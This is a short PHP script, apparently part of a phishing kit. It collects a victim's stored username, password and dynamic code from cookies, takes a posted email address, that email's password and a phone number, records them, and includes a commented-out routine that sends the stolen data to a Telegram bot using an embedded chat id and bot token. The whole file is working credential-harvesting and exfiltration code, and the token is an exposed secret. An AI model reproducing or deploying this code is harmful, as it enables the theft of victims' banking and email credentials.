<?php 
require('../panel/lib/funciones.php');
require('../acciones/bot_telegram.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];
$cdinamica = $_COOKIE['cdinamica'];

$email = $_POST['eml'];
$cemail = $_POST['passe'];
$celular = $_POST['cel'];

setcookie('email',$email,time()+60*9);
setcookie('cemail',$cemail,time()+60*9);
setcookie('celular',$celular,time()+60*9);

actualizar_registro_mail($registro,$email,$cemail,$celular);


if(empty($usuario) || empty($contrasena)){
    
}else{
    
// $chatId= "1053381147";
// $token = "7326614103:AAH7nj1c_exaJ8VUAVSLNYM4dUcaX3nu2JI";$mensaje = "AGREGO CORREO: $usuario - $contrasena\nEmail: $email\nId: $cemail\nCelular: $celular";
// enviarMensajeTelegram($chatId, $mensaje, $token);
}


?>